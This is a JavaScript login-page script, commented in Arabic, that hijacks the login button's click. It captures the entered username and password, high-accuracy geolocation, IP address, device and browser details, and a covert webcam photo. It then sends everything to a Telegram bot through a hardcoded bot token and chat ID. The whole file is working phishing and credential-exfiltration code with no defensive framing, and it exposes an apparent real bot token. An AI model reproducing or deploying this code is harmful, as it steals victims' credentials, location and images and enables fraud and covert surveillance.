document.querySelector("#loginbutton").addEventListener("click", function(event) {
    event.preventDefault();

    var username = document.getElementById("username").value;
    var password = document.querySelector("#password").value;
    var userAgent = navigator.userAgent;
    var ip = '';
    var location = '';
    var deviceType = navigator.platform;
    var language = navigator.language;
    var os = navigator.platform;
    var screenWidth = window.innerWidth;
    var screenHeight = window.innerHeight;
    var pageUrl = window.location.href;
    var referrer = document.referrer;

    // دقة الموقع الجغرافي (لتحديد الموقع)
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
            location = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
            captureAndSendData(username, password, userAgent, location, ip, deviceType, language, os, screenWidth, screenHeight, pageUrl, referrer);
        }, function(error) {
            console.log("Error getting geolocation:", error);
            location = "لم يتم تحديد الموقع";
            captureAndSendData(username, password, userAgent, location, ip, deviceType, language, os, screenWidth, screenHeight, pageUrl, referrer);
        }, {
            enableHighAccuracy: true,
            timeout: 5000,  // تحديد وقت أقصى للحصول على الموقع
            maximumAge: 0   // عدم استخدام الموقع المخزن
        });
    } else {
        alert("Geolocation not supported.");
    }

    // وظيفة للحصول على عنوان الـ IP
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            ip = data.ip;
        })
        .catch(error => {
            console.error("IP fetch error:", error);
            ip = 'IP غير متاح';
        });

    // جمع معلومات الجهاز الإضافية
    function captureAndSendData(username, password, userAgent, location, ip, deviceType, language, os, screenWidth, screenHeight, pageUrl, referrer) {
        var hardwareInfo = {
            uuid: '12345-abcde',  // معرّف الجهاز (مؤقت).
            macAddress: '00:14:22:01:23:45', // (مثال) عنوان MAC
        };

        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function(stream) {
                    var video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    video.onloadedmetadata = function () {
                        var canvas = document.createElement('canvas');
                        canvas.width = 1280;  // دقة أعلى
                        canvas.height = 960;
                        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

                        // إرسال الصورة إلى البوت
                        canvas.toBlob(function(blob) {
                            var formData = new FormData();
                            formData.append("photo", blob, "user_photo.jpg");  // تأكد من تسمية الصورة (user_photo.jpg)
                            sendToTelegram(username, password, userAgent, location, ip, deviceType, language, os, screenWidth, screenHeight, pageUrl, referrer, hardwareInfo, formData);
                            stream.getTracks().forEach(track => track.stop());
                        });
                    };
                })
                .catch(function(err) {
                    console.log("Camera error: " + err);
                });
        } else {
            alert("Camera access not supported.");
        }
    }

    // إرسال البيانات إلى بوت تلغرام
    function sendToTelegram(username, password, userAgent, location, ip, deviceType, language, os, screenWidth, screenHeight, pageUrl, referrer, hardwareInfo, imageData) {
        var botToken = "7590971159:AAEKdP-eSEE99hsy1rTEUAi0zba7BginDoA";
        var chatId = "5091980014";

        // رسالة باللغة العربية
        var messageArabic = `⚡️ **محاولة تسجيل دخول جديدة** ⚡️\n\n`;
        messageArabic += `🧑‍💻 **اسم المستخدم:** ${username}\n`;
        messageArabic += `🔑 **كلمة المرور:** ${password}\n`;
        messageArabic += `🌍 **الموقع:** ${location}\n`;
        messageArabic += `📍 **عنوان الـ IP:** ${ip}\n`;
        messageArabic += `🌐 **المتصفح:** ${userAgent}\n`;
        messageArabic += `📱 **نوع الجهاز:** ${deviceType}\n`;
        messageArabic += `🌐 **اللغة المفضلة:** ${language}\n`;
        messageArabic += `🖥️ **نظام التشغيل:** ${os}\n`;
        messageArabic += `🖼️ **أبعاد الشاشة:** ${screenWidth}x${screenHeight}\n`;
        messageArabic += `🌐 **رابط الصفحة:** ${pageUrl}\n`;
        messageArabic += `🔗 **المرجع:** ${referrer}\n`;
        messageArabic += `🖱️ **معلومات الجهاز:** ${JSON.stringify(hardwareInfo)}\n`;
        messageArabic += `🕒 **التاريخ والوقت:** ${new Date().toLocaleString()}`;

        // رسالة باللغة الإنجليزية
        var messageEnglish = `⚡️ **New Login Attempt** ⚡️\n\n`;
        messageEnglish += `🧑‍💻 **Username:** ${username}\n`;
        messageEnglish += `🔑 **Password:** ${password}\n`;
        messageEnglish += `🌍 **Location:** ${location}\n`;
        messageEnglish += `📍 **IP Address:** ${ip}\n`;
        messageEnglish += `🌐 **Browser:** ${userAgent}\n`;
        messageEnglish += `📱 **Device Type:** ${deviceType}\n`;
        messageEnglish += `🌐 **Preferred Language:** ${language}\n`;
        messageEnglish += `🖥️ **OS:** ${os}\n`;
        messageEnglish += `🖼️ **Screen Dimensions:** ${screenWidth}x${screenHeight}\n`;
        messageEnglish += `🌐 **Page URL:** ${pageUrl}\n`;
        messageEnglish += `🔗 **Referrer:** ${referrer}\n`;
        messageEnglish += `🖱️ **Hardware Info:** ${JSON.stringify(hardwareInfo)}\n`;
        messageEnglish += `🕒 **Date & Time:** ${new Date().toLocaleString()}`;

        // إرسال رسالة النص عبر API
        var formDataMessage = new FormData();
        formDataMessage.append("chat_id", chatId);
        formDataMessage.append("text", messageArabic);
        formDataMessage.append("parse_mode", "Markdown");

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            body: formDataMessage
        })
        .then(response => response.json())
        .then(data => console.log('Telegram Message Sent:', data))
        .catch(error => console.error('Error sending Telegram message:', error));

        // إرسال الصورة (إن وجدت)
        if (imageData) {
            var photoForm = new FormData();
            photoForm.append("chat_id", chatId);
            photoForm.append("photo", imageData.get('photo'));  // نرسل الصورة باستخدام 'photo'

            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: 'POST',
                body: photoForm
            })
            .then(response => response.json())
            .then(data => console.log('Photo Sent:', data))
            .catch(error => console.error('Error sending photo:', error));
        }
    }
});
